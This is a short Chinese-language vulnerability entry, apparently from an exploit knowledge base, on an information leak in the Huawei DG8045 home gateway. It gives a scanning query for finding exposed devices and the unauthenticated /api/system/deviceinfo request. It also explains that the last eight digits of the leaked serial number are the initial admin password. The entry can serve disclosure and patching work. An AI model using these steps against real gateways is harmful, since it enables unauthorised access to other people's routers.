

# Huawei DG8045 deviceinfo 信息泄漏漏洞

## 漏洞描述

Huawei DG8045 deviceinfo api接口存在信息泄漏漏洞，攻击者通过泄漏的信息可以获得账号密码登录后台

## 漏洞影响

<a-checkbox checked>Huawei DG8045</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="DG8045-Home-Gateway-DG8045"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1648696791637-1a79e231-0011-4736-ba99-d8f60c3edb90.png)

验证POC

```php
/api/system/deviceinfo
```

![img](../../../.vuepress/public/img/1648697448559-e9f4657e-ef69-40d3-aa61-abc87a2a0f53.png)

SerialNumber 后8位即为初始密码